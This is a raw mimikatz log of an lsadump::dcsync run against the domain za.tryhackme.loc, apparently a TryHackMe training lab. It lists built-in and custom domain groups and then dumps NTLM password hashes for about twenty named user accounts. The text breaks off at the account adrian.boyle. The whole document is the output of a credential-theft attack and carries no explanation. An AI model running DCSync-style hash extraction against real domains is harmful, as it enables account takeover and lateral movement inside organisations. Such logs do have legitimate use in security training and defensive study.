Using 'lorraine.gill_dcdump.txt' for logfile : OK

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] Exporting domain 'za.tryhackme.loc'
[rpc] Service  : ldap
SAM Username         : Guest
User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-501
Object Relative ID   : 501

Credentials:

Object RDN           : Builtin


Object RDN           : S-1-5-4


Object RDN           : S-1-5-11


Object RDN           : Remote Desktop Users

** SAM ACCOUNT **

SAM Username         : Remote Desktop Users
Object Security ID   : S-1-5-32-555
Object Relative ID   : 555

Credentials:

Object RDN           : Network Configuration Operators

** SAM ACCOUNT **

SAM Username         : Network Configuration Operators
Object Security ID   : S-1-5-32-556
Object Relative ID   : 556

Credentials:

Object RDN           : Performance Monitor Users

** SAM ACCOUNT **

SAM Username         : Performance Monitor Users
Object Security ID   : S-1-5-32-558
Object Relative ID   : 558

Credentials:

Object RDN           : Performance Log Users

** SAM ACCOUNT **

SAM Username         : Performance Log Users
Object Security ID   : S-1-5-32-559
Object Relative ID   : 559

Credentials:

Object RDN           : Distributed COM Users

** SAM ACCOUNT **

SAM Username         : Distributed COM Users
Object Security ID   : S-1-5-32-562
Object Relative ID   : 562

Credentials:

Object RDN           : S-1-5-17


Object RDN           : IIS_IUSRS

** SAM ACCOUNT **

SAM Username         : IIS_IUSRS
Object Security ID   : S-1-5-32-568
Object Relative ID   : 568

Credentials:

Object RDN           : Cryptographic Operators

** SAM ACCOUNT **

SAM Username         : Cryptographic Operators
Object Security ID   : S-1-5-32-569
Object Relative ID   : 569

Credentials:

Object RDN           : Event Log Readers

** SAM ACCOUNT **

SAM Username         : Event Log Readers
Object Security ID   : S-1-5-32-573
Object Relative ID   : 573

Credentials:

Object RDN           : RDS Remote Access Servers

** SAM ACCOUNT **

SAM Username         : RDS Remote Access Servers
Object Security ID   : S-1-5-32-575
Object Relative ID   : 575

Credentials:

Object RDN           : RDS Endpoint Servers

** SAM ACCOUNT **

SAM Username         : RDS Endpoint Servers
Object Security ID   : S-1-5-32-576
Object Relative ID   : 576

Credentials:

Object RDN           : RDS Management Servers

** SAM ACCOUNT **

SAM Username         : RDS Management Servers
Object Security ID   : S-1-5-32-577
Object Relative ID   : 577

Credentials:

Object RDN           : Hyper-V Administrators

** SAM ACCOUNT **

SAM Username         : Hyper-V Administrators
Object Security ID   : S-1-5-32-578
Object Relative ID   : 578

Credentials:

Object RDN           : Access Control Assistance Operators

** SAM ACCOUNT **

SAM Username         : Access Control Assistance Operators
Object Security ID   : S-1-5-32-579
Object Relative ID   : 579

Credentials:

Object RDN           : Remote Management Users

** SAM ACCOUNT **

SAM Username         : Remote Management Users
Object Security ID   : S-1-5-32-580
Object Relative ID   : 580

Credentials:

Object RDN           : Storage Replica Administrators

** SAM ACCOUNT **

SAM Username         : Storage Replica Administrators
Object Security ID   : S-1-5-32-582
Object Relative ID   : 582

Credentials:

Object RDN           : Domain Computers

** SAM ACCOUNT **

SAM Username         : Domain Computers
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-515
Object Relative ID   : 515

Credentials:

Object RDN           : Domain Guests

** SAM ACCOUNT **

SAM Username         : Domain Guests
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-514
Object Relative ID   : 514

Credentials:

Object RDN           : RAS and IAS Servers

** SAM ACCOUNT **

SAM Username         : RAS and IAS Servers
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-553
Object Relative ID   : 553

Credentials:

Object RDN           : Terminal Server License Servers

** SAM ACCOUNT **

SAM Username         : Terminal Server License Servers
Object Security ID   : S-1-5-32-561
Object Relative ID   : 561

Credentials:

Object RDN           : Users

** SAM ACCOUNT **

SAM Username         : Users
Object Security ID   : S-1-5-32-545
Object Relative ID   : 545

Credentials:

Object RDN           : Guests

** SAM ACCOUNT **

SAM Username         : Guests
Object Security ID   : S-1-5-32-546
Object Relative ID   : 546

Credentials:

Object RDN           : Group Policy Creator Owners

** SAM ACCOUNT **

SAM Username         : Group Policy Creator Owners
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-520
Object Relative ID   : 520

Credentials:

Object RDN           : S-1-5-9


Object RDN           : Windows Authorization Access Group

** SAM ACCOUNT **

SAM Username         : Windows Authorization Access Group
Object Security ID   : S-1-5-32-560
Object Relative ID   : 560

Credentials:

Object RDN           : 6E157EDF-4E72-4052-A82A-EC3F91021A22


Object RDN           : Allowed RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Allowed RODC Password Replication Group
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-571
Object Relative ID   : 571

Credentials:

Object RDN           : Cloneable Domain Controllers

** SAM ACCOUNT **

SAM Username         : Cloneable Domain Controllers
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-522
Object Relative ID   : 522

Credentials:

Object RDN           : Protected Users

** SAM ACCOUNT **

SAM Username         : Protected Users
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-525
Object Relative ID   : 525

Credentials:

Object RDN           : Key Admins

** SAM ACCOUNT **

SAM Username         : Key Admins
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-526
Object Relative ID   : 526

Credentials:

Object RDN           : DnsAdmins

** SAM ACCOUNT **

SAM Username         : DnsAdmins
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1102
Object Relative ID   : 1102

Credentials:

Object RDN           : DnsUpdateProxy

** SAM ACCOUNT **

SAM Username         : DnsUpdateProxy
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1103
Object Relative ID   : 1103

Credentials:

Object RDN           : MicrosoftDNS


Object RDN           : RootDNSServers


Object RDN           : @


Object RDN           : A.ROOT-SERVERS.NET


Object RDN           : B.ROOT-SERVERS.NET


Object RDN           : C.ROOT-SERVERS.NET


Object RDN           : D.ROOT-SERVERS.NET


Object RDN           : E.ROOT-SERVERS.NET


Object RDN           : F.ROOT-SERVERS.NET


Object RDN           : G.ROOT-SERVERS.NET


Object RDN           : H.ROOT-SERVERS.NET


Object RDN           : I.ROOT-SERVERS.NET


Object RDN           : J.ROOT-SERVERS.NET


Object RDN           : K.ROOT-SERVERS.NET


Object RDN           : L.ROOT-SERVERS.NET


Object RDN           : M.ROOT-SERVERS.NET


Object RDN           : Server


Object RDN           : DFSR-GlobalSettings


Object RDN           : Domain System Volume


Object RDN           : Content


Object RDN           : SYSVOL Share


Object RDN           : Topology


Object RDN           : THMDC


Object RDN           : Domain System Volume


Object RDN           : DFSR-LocalSettings


Object RDN           : SYSVOL Subscription


Object RDN           : Unix


Object RDN           : Consulting


Object RDN           : Engineering


Object RDN           : IT


Object RDN           : Human Resources


Object RDN           : Finance


Object RDN           : Tier 0 Admins

** SAM ACCOUNT **

SAM Username         : Tier 0 Admins
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1106
Object Relative ID   : 1106

Credentials:

Object RDN           : Server Admins

** SAM ACCOUNT **

SAM Username         : Server Admins
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1108
Object Relative ID   : 1108

Credentials:

Object RDN           : Tier 1 Admins

** SAM ACCOUNT **

SAM Username         : Tier 1 Admins
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1105
Object Relative ID   : 1105

Credentials:

Object RDN           : HR Share RW

** SAM ACCOUNT **

SAM Username         : HR Share RW
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1107
Object Relative ID   : 1107

Credentials:

Object RDN           : Internet Access

** SAM ACCOUNT **

SAM Username         : Internet Access
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1109
Object Relative ID   : 1109

Credentials:

Object RDN           : Machine


Object RDN           : User


Object RDN           : Machine


Object RDN           : User


Object RDN           : {CEC2F055-AE42-415B-B811-FB0A055CD76E}


Object RDN           : Denied RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Denied RODC Password Replication Group
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-572
Object Relative ID   : 572

Credentials:

Object RDN           : BCKUPKEY_c81eb1c3-d990-4dde-961e-89365ed5c13e Secret


Object RDN           : BCKUPKEY_P Secret


Object RDN           : BCKUPKEY_501d7cd0-5e9c-45c0-8d5e-dab74c7fa104 Secret


Object RDN           : BCKUPKEY_PREFERRED Secret


Object RDN           : Groups


Object RDN           : Tier 2 Admins

** SAM ACCOUNT **

SAM Username         : Tier 2 Admins
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1104
Object Relative ID   : 1104

Credentials:

Object RDN           : Machine


Object RDN           : User


Object RDN           : Workstations


Object RDN           : {5742BFA2-F0C5-4960-9789-5C1F055189F3}


Object RDN           : T0 Admins


Object RDN           : T1 Admins


Object RDN           : Sales


Object RDN           : T2 Admins


Object RDN           : People


Object RDN           : Marketing


Object RDN           : Machine


Object RDN           : User


Object RDN           : Management Servers


Object RDN           : {184EA93A-018E-416D-AD98-A9973AFC118F}


Object RDN           : DomainDnsZones


Object RDN           : Certificate Service DCOM Access

** SAM ACCOUNT **

SAM Username         : Certificate Service DCOM Access
Object Security ID   : S-1-5-32-574
Object Relative ID   : 574

Credentials:

Object RDN           : Cert Publishers

** SAM ACCOUNT **

SAM Username         : Cert Publishers
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-517
Object Relative ID   : 517

Credentials:

Object RDN           : Pre-Windows 2000 Compatible Access

** SAM ACCOUNT **

SAM Username         : Pre-Windows 2000 Compatible Access
Object Security ID   : S-1-5-32-554
Object Relative ID   : 554

Credentials:

Object RDN           : Machine


Object RDN           : User


Object RDN           : {590F154F-1ED2-40BE-9019-556AE247DF69}


Object RDN           : Web Servers


Object RDN           : Server Management

** SAM ACCOUNT **

SAM Username         : Server Management
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-6157
Object Relative ID   : 6157

Credentials:

Object RDN           : IT Support

** SAM ACCOUNT **

SAM Username         : IT Support
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-6154
Object Relative ID   : 6154

Credentials:

Object RDN           : Machine


Object RDN           : User


Object RDN           : {5E5A868A-097B-4A9D-9E11-DE99C2FC6B82}


Object RDN           : Machine


Object RDN           : User


Object RDN           : {B83D0297-D76D-4E13-934D-1E8B5526F7EC}


Object RDN           : Ben F

** SAM ACCOUNT **

SAM Username         : benjamin
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-6158
Object Relative ID   : 6158

Credentials:
  Hash NTLM: b560ae88a8b42e690ff54f0adafd11dc

Object RDN           : lisa.carr

** SAM ACCOUNT **

SAM Username         : lisa.carr
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1110
Object Relative ID   : 1110

Credentials:
  Hash NTLM: 6a5a37b4a5c6bdc55068b7f282c1c47b

Object RDN           : nicole.morgan

** SAM ACCOUNT **

SAM Username         : nicole.morgan
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1111
Object Relative ID   : 1111

Credentials:
  Hash NTLM: ab73a23c9e7cba05f077cf04c9b99acf

Object RDN           : daniel.wood

** SAM ACCOUNT **

SAM Username         : daniel.wood
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1112
Object Relative ID   : 1112

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : hugh.jones

** SAM ACCOUNT **

SAM Username         : hugh.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1113
Object Relative ID   : 1113

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : brenda.black

** SAM ACCOUNT **

SAM Username         : brenda.black
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1115
Object Relative ID   : 1115

Credentials:
  Hash NTLM: d1dccb93645a38262699ace7b55d2571

Object RDN           : louis.cole

** SAM ACCOUNT **

SAM Username         : louis.cole
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1120
Object Relative ID   : 1120

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : pauline.hargreaves

** SAM ACCOUNT **

SAM Username         : pauline.hargreaves
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1121
Object Relative ID   : 1121

Credentials:
  Hash NTLM: 733b09bbada29de2bac18acc14fa2fb8

Object RDN           : sean.hopkins

** SAM ACCOUNT **

SAM Username         : sean.hopkins
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1122
Object Relative ID   : 1122

Credentials:
  Hash NTLM: 1e0fd5b4ff06bf1dd730e81ca63be956

Object RDN           : sylvia.robinson

** SAM ACCOUNT **

SAM Username         : sylvia.robinson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1123
Object Relative ID   : 1123

Credentials:
  Hash NTLM: 35c1630e7cc1b440889d8904ec6dd06a

Object RDN           : alice.gibson

** SAM ACCOUNT **

SAM Username         : alice.gibson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1124
Object Relative ID   : 1124

Credentials:
  Hash NTLM: dcda5e5c4e149ea8f9c275ae384b4f7b

Object RDN           : mandy.armstrong

** SAM ACCOUNT **

SAM Username         : mandy.armstrong
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1125
Object Relative ID   : 1125

Credentials:
  Hash NTLM: 3740ad538d823ccda315cb14a98a57e4

Object RDN           : paula.bailey

** SAM ACCOUNT **

SAM Username         : paula.bailey
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1126
Object Relative ID   : 1126

Credentials:
  Hash NTLM: d466a2cb02ae838500c5fb6cde4339a6

Object RDN           : christine.hall

** SAM ACCOUNT **

SAM Username         : christine.hall
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1130
Object Relative ID   : 1130

Credentials:
  Hash NTLM: 64d1489c0810a90e2c2ad386bcda734e

Object RDN           : phillip.wilkins

** SAM ACCOUNT **

SAM Username         : phillip.wilkins
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1131
Object Relative ID   : 1131

Credentials:
  Hash NTLM: 15d62440a876440c651e59b8d484d612

Object RDN           : colin.lane

** SAM ACCOUNT **

SAM Username         : colin.lane
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1132
Object Relative ID   : 1132

Credentials:
  Hash NTLM: 3b53effa9d6078584ffde6f27323050c

Object RDN           : louis.thornton

** SAM ACCOUNT **

SAM Username         : louis.thornton
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1133
Object Relative ID   : 1133

Credentials:
  Hash NTLM: 6fd9100854d436f7c864af2c79359970

Object RDN           : irene.leach

** SAM ACCOUNT **

SAM Username         : irene.leach
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1134
Object Relative ID   : 1134

Credentials:
  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b

Object RDN           : ruth.dale

** SAM ACCOUNT **

SAM Username         : ruth.dale
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1135
Object Relative ID   : 1135

Credentials:
  Hash NTLM: 73852e46df58547bc37436de42b2d704

Object RDN           : adrian.boyle

** SAM ACCOUNT **

SAM Username         : adrian.boyle
